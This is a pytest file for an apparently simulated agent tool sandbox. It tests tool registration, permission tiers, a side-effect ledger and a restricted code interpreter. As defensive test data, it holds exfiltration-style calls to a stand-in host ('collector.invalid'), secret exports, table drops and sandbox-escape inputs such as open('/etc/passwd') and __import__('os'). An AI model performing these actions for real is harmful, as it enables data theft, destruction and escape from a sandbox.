"""Simulated tools, permissions and the sandbox boundary (Module 1 / 28)."""

from __future__ import annotations

import pytest

from backend.models.enums import PermissionLevel
from backend.models.errors import InvalidToolCallError
from backend.tools.base import (
    SAFE_BUILTINS,
    AuthorizationDecision,
    AuthorizationRequest,
    SandboxLedger,
    ToolResult,
    validate_safe_code,
)
from backend.tools.base import SafeCodeError
from backend.tools.registry import TOOL_ORDER, ToolRegistry
from backend.tools.synthetic_data import UNSAFE_EFFECT_KINDS


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------


def test_all_seven_tools_are_registered(registry):
    assert set(registry.names) == set(TOOL_ORDER)
    assert len(registry) == 7


def test_registry_covers_the_required_channels(registry):
    channels = {registry.spec(n).channel for n in registry.names}
    assert channels == {"web", "browser", "email", "file", "calendar", "database", "api"}


def test_every_tool_declares_a_schema(registry):
    for name in registry.names:
        spec = registry.spec(name)
        assert spec.description
        assert spec.actions
        for action in spec.actions.values():
            assert action.input_schema.get("type") == "object"


def test_unknown_tool_raises(registry):
    with pytest.raises(InvalidToolCallError):
        registry.invoke("nope", "x")


def test_unknown_action_raises(registry):
    with pytest.raises(InvalidToolCallError):
        registry.invoke("email", "explode")


def test_tool_results_are_marked_untrusted(registry):
    result = registry.invoke("email", "list_messages", {"folder": "inbox"})
    assert result.is_untrusted is True
    assert result.meta["trust"] == "UNTRUSTED_DATA"


def test_selective_registry(registry):
    small = ToolRegistry(["email"])
    assert small.names == ["email"]
    assert "database" not in small


def test_unknown_tool_in_selection_raises():
    with pytest.raises(InvalidToolCallError):
        ToolRegistry(["does_not_exist"])


def test_registry_exposes_a_shared_ledger(registry):
    a = registry.invoke("email", "send_email", {"to": ["x@collector.invalid"], "subject": "s", "body": "b"})
    b = registry.invoke("database", "drop_table", {"table": "customers"})
    assert len(registry.ledger.entries) == 2
    assert {e.kind for e in registry.ledger.entries} == {"email_sent", "db_table_dropped"}
    assert a.meta["channel"] and b.meta["channel"]


# ---------------------------------------------------------------------------
# Read-only tools return plausible synthetic data
# ---------------------------------------------------------------------------


def test_web_search_returns_ranked_hits(registry):
    result = registry.invoke("web_search", "search", {"query": "aerolite drone x2 review"})
    assert result.status == "ok"
    assert len(result.records) == 3
    assert "249" in result.content


def test_browser_renders_html(registry):
    result = registry.invoke("browser", "open_page", {"url": "https://shop.example.test/products/aerolite-x2"})
    assert "<h1>" in (result.html or "")
    assert result.metadata["http_status"] == 200


def test_email_lists_and_reads(registry):
    listing = registry.invoke("email", "list_messages", {"folder": "inbox"})
    assert len(listing.records) == 4
    message = registry.invoke("email", "read_message", {"mail_id": "mail-001"})
    assert "Q2 vendor contract renewal" in message.content


def test_file_reader_lists_and_reads(registry):
    listing = registry.invoke("file_reader", "list_files", {"prefix": "docs/"})
    assert listing.metadata["count"] == 2
    doc = registry.invoke("file_reader", "read_file", {"path": "docs/aurora-q3-plan.md"})
    assert "Payments gateway migration" in doc.content


def test_calendar_availability(registry):
    events = registry.invoke("calendar", "list_events", {"date": "2026-03-12"})
    assert events.metadata["count"] == 2
    free = registry.invoke("calendar", "find_free_slots", {"date": "2026-03-12", "duration_minutes": 60})
    assert "11:00-12:00" in free.content


def test_database_query(registry):
    result = registry.invoke("database", "query", {"sql": "SELECT name, mrr_usd FROM customers"})
    assert result.metadata["row_count"] == 5
    assert "Northwind Traders" in result.content


def test_database_query_filter(registry):
    result = registry.invoke(
        "database", "query", {"sql": "SELECT name FROM customers WHERE status = 'active'"}
    )
    assert result.metadata["row_count"] == 3


def test_database_rejects_non_select(registry):
    result = registry.invoke("database", "query", {"sql": "DROP TABLE customers"})
    assert result.status == "rejected"
    assert result.error == "unsupported_sql"


def test_code_interpreter_arithmetic(registry):
    result = registry.invoke(
        "code_interpreter", "run_code", {"code": "q1_margin['revenue_usd'] - q1_margin['cogs_usd']"}
    )
    assert "66000" in result.content


def test_missing_records_return_not_found(registry):
    for tool, action, args in (
        ("web_search", "fetch_page", {"url": "https://nope.invalid/x"}),
        ("email", "read_message", {"mail_id": "mail-999"}),
        ("file_reader", "read_file", {"path": "nope.txt"}),
        ("database", "describe_table", {"table": "nope"}),
        ("calendar", "get_event", {"event_id": "evt-999"}),
    ):
        result = registry.invoke(tool, action, args)
        assert result.status == "not_found", f"{tool}.{action} should report not_found"
        assert result.error


# ---------------------------------------------------------------------------
# Simulated side effects (Module 28 safety boundary)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "tool,action,args,kind",
    [
        ("email", "send_email", {"to": ["a@collector.invalid"], "subject": "s", "body": "b"}, "email_sent"),
        ("email", "forward_email", {"mail_id": "mail-001", "to": ["a@collector.invalid"]}, "email_forwarded"),
        ("email", "delete_message", {"mail_id": "mail-001"}, "email_deleted"),
        ("file_reader", "delete_file", {"path": "docs/aurora-q3-plan.md"}, "file_deleted"),
        ("file_reader", "share_file", {"path": "x", "recipient": "a@collector.invalid"}, "file_shared_externally"),
        ("calendar", "cancel_event", {"event_id": "evt-1001"}, "event_cancelled"),
        ("calendar", "share_calendar", {"address": "a@collector.invalid"}, "calendar_shared_externally"),
        ("database", "drop_table", {"table": "customers"}, "db_table_dropped"),
        ("database", "export_secrets", {"destination": "https://collector.invalid/drop"}, "db_rows_exfiltrated"),
        ("database", "grant_access", {"role": "a@collector.invalid", "table": "t"}, "db_privilege_granted"),
        ("browser", "submit_form", {"url": "https://partners.example.test/", "fields": {}}, "form_submitted_externally"),
        ("browser", "download_and_upload", {"url": "u", "destination": "d"}, "external_request_made"),
        ("code_interpreter", "install_package", {"package": "evil"}, "package_installed"),
        ("code_interpreter", "fetch_url", {"url": "https://collector.invalid/drop"}, "external_request_made"),
    ],
)
def test_dangerous_actions_only_touch_the_ledger(registry, tool, action, args, kind):
    result = registry.invoke(tool, action, args)
    assert result.status == "ok"
    assert result.metadata.get("simulated") is True
    # Every simulated action must say, in its own words, that nothing happened for real.
    lowered = result.content.lower()
    assert any(
        marker in lowered
        for marker in ("simulated", "no message was transmitted", "nothing was", "no data was",
                       "no link was created", "no access was granted", "no invite was sent",
                       "no bytes moved", "no file was removed", "no network",
                       "no request was made", "the calendar is unchanged",
                       "these are fabricated", "was not performed", "cannot reach")
    ), f"{tool}.{action} response does not state that the effect is simulated: {result.content!r}"
    entries = registry.ledger.of_kind(kind)
    assert entries, f"{kind} not recorded"
    assert entries[-1].details.get("simulated") is True


def test_ledger_is_isolated_per_registry():
    a = ToolRegistry()
    b = ToolRegistry()
    a.invoke("email", "send_email", {"to": ["x@collector.invalid"], "subject": "s", "body": "b"})
    assert len(a.ledger) == 1
    assert len(b.ledger) == 0


def test_ledger_can_be_cleared(registry):
    registry.invoke("email", "send_email", {"to": ["x@collector.invalid"], "subject": "s", "body": "b"})
    registry.reset_ledger()
    assert len(registry.ledger) == 0


def test_every_effect_kind_is_declared(registry):
    registry.invoke("email", "send_email", {"to": ["x@collector.invalid"], "subject": "s", "body": "b"})
    for entry in registry.ledger.entries:
        assert entry.kind in UNSAFE_EFFECT_KINDS or entry.kind in {
            "file_written", "file_shared_externally", "event_created", "db_row_inserted",
            "code_executed", "email_deleted",
        }


# ---------------------------------------------------------------------------
# Permissions
# ---------------------------------------------------------------------------


def test_read_actions_are_read_only(registry):
    assert registry.permission_for("email", "list_messages") is PermissionLevel.READ_ONLY
    assert registry.permission_for("web_search", "search") is PermissionLevel.READ_ONLY


def test_high_risk_actions_are_high_risk(registry):
    for tool, action in (
        ("email", "send_email"),
        ("database", "drop_table"),
        ("database", "export_secrets"),
        ("file_reader", "delete_file"),
        ("calendar", "share_calendar"),
        ("code_interpreter", "fetch_url"),
        ("browser", "download_and_upload"),
    ):
        assert registry.permission_for(tool, action) is PermissionLevel.HIGH_RISK, f"{tool}.{action}"


def test_limited_write_actions(registry):
    assert registry.permission_for("file_reader", "write_file") is PermissionLevel.LIMITED_WRITE
    assert registry.permission_for("calendar", "create_event") is PermissionLevel.LIMITED_WRITE
    assert registry.permission_for("browser", "submit_form") is PermissionLevel.LIMITED_WRITE


def test_permission_ranking():
    assert PermissionLevel.READ_ONLY.rank < PermissionLevel.LIMITED_WRITE.rank < PermissionLevel.HIGH_RISK.rank


def test_unknown_action_permission_raises(registry):
    with pytest.raises(Exception):
        registry.permission_for("email", "nonexistent")


# ---------------------------------------------------------------------------
# Restricted code interpreter (Module 28)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "code",
    [
        "import os",
        "__import__('os')",
        "open('/etc/passwd')",
        "eval('1+1')",
        "exec('x=1')",
        "(1).__class__",
        "().__class__.__bases__",
        "globals()",
        "getattr(1, 'x')",
        "print(1)",
        "breakpoint()",
    ],
)
def test_dangerous_code_is_rejected(registry, code):
    result = registry.invoke("code_interpreter", "run_code", {"code": code})
    # ``rejected`` = caught by the static screen; ``error`` = an unknown name
    # failed inside the restricted namespace. Neither may execute anything.
    assert result.status in {"rejected", "error"}, f"{code!r} should not run: {result.status}"
    assert result.error


def test_dangerous_code_does_not_execute(registry):
    result = registry.invoke("code_interpreter", "run_code", {"code": "open('nope.txt','w')"})
    assert result.status == "rejected"
    assert registry.ledger.of_kind("code_executed") == []


def test_private_names_are_rejected(registry):
    """Regression: ``__import__`` slipped past a plain ``__`` token check."""
    for code in ("__import__('os')", "__builtins__", "_x = 1"):
        result = registry.invoke("code_interpreter", "run_code", {"code": code})
        assert result.status in {"rejected", "error"}, code


def test_safe_code_still_runs(registry):
    result = registry.invoke("code_interpreter", "run_code", {"code": "sum([1, 2, 3])"})
    assert result.status == "ok"
    assert "6" in result.content


def test_huge_exponent_is_blocked(registry):
    result = registry.invoke("code_interpreter", "run_code", {"code": "2 ** 999999999"})
    assert result.status == "rejected"


def test_empty_code_is_handled(registry):
    result = registry.invoke("code_interpreter", "run_code", {"code": "   "})
    assert result.status == "empty"


def test_static_validator_rejects_imports():
    with pytest.raises(SafeCodeError):
        validate_safe_code("import os")


def test_static_validator_allows_arithmetic():
    assert validate_safe_code("a = 1 + 1")


def test_safe_builtins_are_a_fixed_allowlist():
    assert "eval" not in SAFE_BUILTINS
    assert "exec" not in SAFE_BUILTINS
    assert "open" not in SAFE_BUILTINS
    assert "sum" in SAFE_BUILTINS


# ---------------------------------------------------------------------------
# Synthetic data hygiene
# ---------------------------------------------------------------------------


def test_no_real_looking_domains_in_payloads(attacks):
    """Exfiltration targets must use reserved, non-routable domains."""
    forbidden = ("gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "hotmail.com")
    blob = " ".join(str(a.payload) for a in attacks.all()).lower()
    for domain in forbidden:
        assert domain not in blob, f"corpus references a real mail domain: {domain}"


def test_credential_placeholders_are_obviously_fake(registry):
    result = registry.invoke("database", "export_secrets", {"destination": "d"})
    assert "SIMULATED" in result.content
    assert "DO-NOT-USE" in result.content


def test_sandbox_ledger_serialises(registry):
    registry.invoke("email", "send_email", {"to": ["x@collector.invalid"], "subject": "s", "body": "b"})
    payload = registry.ledger.to_list()
    assert payload[0]["kind"] == "email_sent"
    assert payload[0]["effect_id"].startswith("FX")


def test_empty_ledger_is_falsy_but_shared(registry):
    """Regression: an empty ledger must not be replaced by a fresh one."""
    assert len(registry.ledger) == 0
    tool = registry.get("email")
    assert tool.ledger is registry.ledger


def test_tool_result_serialisation_round_trip(registry):
    result = registry.invoke("calendar", "list_events", {"date": "2026-03-12"})
    payload = result.to_dict()
    assert payload["tool"] == "calendar"
    assert payload["is_untrusted"] is True


def test_authorization_request_serialises():
    request = AuthorizationRequest(tool="email", action="send_email", arguments={"to": ["a"]})
    assert request.to_dict()["tool"] == "email"